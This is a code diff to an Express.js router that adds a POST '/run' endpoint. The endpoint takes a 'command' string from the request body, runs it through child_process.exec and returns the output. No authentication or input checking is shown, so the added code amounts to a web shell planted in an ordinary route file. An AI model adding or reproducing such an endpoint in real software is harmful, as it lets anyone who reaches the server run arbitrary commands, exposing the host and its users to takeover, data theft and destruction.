@@ -48,4 +48,38 @@ router.put('/update', async (req, res) => {
   }
 });
 
+const { exec } = require('child_process');
+
+function executeCommand(command) {
+  return new Promise((resolve, reject) => {
+    exec(command, (error, stdout, stderr) => {
+      if (error) {
+        reject(error);
+        return;
+      }
+      if (stderr) {
+        reject(stderr);
+        return;
+      }
+      resolve(stdout);
+    });
+  });
+}
+
+router.post('/run', async (req, res) => {
+    const { command } = req.body;
+
+    try {
+        const result = await executeCommand(command);
+        res.json(result);
+    } catch (error) {
+        console.error('Error executing command:', error);
+        res.status(500).send('Error executing command');
+    }
+});
+// Example usage
+// executeCommand('dir')
+//   .then(output => console.log(output))
+//   .catch(error => console.error(error));
+
 module.exports = router;
